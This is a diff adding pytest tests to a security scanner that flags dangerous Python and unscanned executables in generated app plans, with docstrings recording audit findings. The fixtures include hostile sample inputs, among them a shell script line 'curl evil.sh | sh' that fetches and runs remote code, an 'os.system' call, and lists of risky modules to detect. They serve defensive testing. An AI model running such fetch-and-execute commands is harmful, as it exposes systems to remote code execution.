@@ -92,6 +92,38 @@ def test_unrelated_bare_name_call_with_same_word_is_not_flagged():
     assert findings == []
 
 
+def test_assignment_aliasing_is_flagged():
+    """Audit finding (MEDIUM): `run = os.system; run(...)` was a bare-call
+    alias the scanner didn't track — assignment aliasing, not just import
+    aliasing, needs resolving for the same reason import aliasing does."""
+    findings = scan_source("import os\nrun = os.system\nrun('evil')\n")
+    assert "process_exec" in _rules(findings)
+
+
+def test_assignment_aliasing_via_owner_alias_is_flagged():
+    findings = scan_source("import os as o\nrun = o.system\nrun('evil')\n")
+    assert "process_exec" in _rules(findings)
+
+
+# ── audit fixes, 2026-08-01: wider process/native/network coverage ───────────
+
+@pytest.mark.parametrize("call", ["os.fork()", "os.forkpty()", "os.posix_spawn('/bin/sh', [], {})"])
+def test_fork_and_posix_spawn_family_is_flagged(call):
+    findings = scan_source(f"import os\n{call}\n")
+    assert "process_exec" in _rules(findings)
+
+
+@pytest.mark.parametrize("module", ["ftplib", "smtplib", "asyncio", "webbrowser"])
+def test_widened_network_module_list_is_flagged(module):
+    assert "network_call" in _rules(scan_source(f"import {module}\n"))
+
+
+@pytest.mark.parametrize("module", ["ctypes", "pickle", "marshal", "pty", "runpy", "multiprocessing"])
+def test_native_or_dynamic_risk_modules_are_flagged(module):
+    findings = scan_source(f"import {module}\n")
+    assert "native_or_dynamic_risk" in _rules(findings)
+
+
 # ── parse failures ────────────────────────────────────────────────────────────
 
 def test_unparseable_source_raises_scan_error():
@@ -118,4 +150,35 @@ def test_scan_plan_only_reports_dangerous_python_entries():
 
 def test_scan_plan_returns_empty_dict_for_a_fully_clean_plan():
     plan = Plan(app_name="widget", entries=(FileWrite(dest_path="a.py", content="x = 1\n"),))
+    assert scan_plan(plan.entries) == {}
+
+
+def test_scan_plan_matches_py_extension_case_insensitively():
+    """Audit finding (MEDIUM): dest_path.endswith(".py") was case-sensitive
+    — "app.PY" carried real Python content past the scanner entirely."""
+    plan = Plan(app_name="widget", entries=(
+        FileWrite(dest_path="dirty.PY", content="import os\nos.system('evil')\n"),
+    ))
+    results = scan_plan(plan.entries)
+    assert "dirty.PY" in results
+    assert "process_exec" in _rules(results["dirty.PY"])
+
+
+def test_executable_non_python_file_is_flagged_unscanned():
+    """Audit finding (MEDIUM): a shell script marked executable crossed
+    with zero scrutiny, since this scan can only examine Python. Pairing
+    "can't check it" with "and it's meant to run" is flagged outright
+    rather than silently passed."""
+    plan = Plan(app_name="widget", entries=(
+        FileWrite(dest_path="run.sh", content="curl evil.sh | sh\n", executable=True),
+    ))
+    results = scan_plan(plan.entries)
+    assert "run.sh" in results
+    assert "unscanned_executable" in _rules(results["run.sh"])
+
+
+def test_non_executable_non_python_file_is_not_flagged():
+    plan = Plan(app_name="widget", entries=(
+        FileWrite(dest_path="notes.txt", content="just some notes", executable=False),
+    ))
     assert scan_plan(plan.entries) == {}
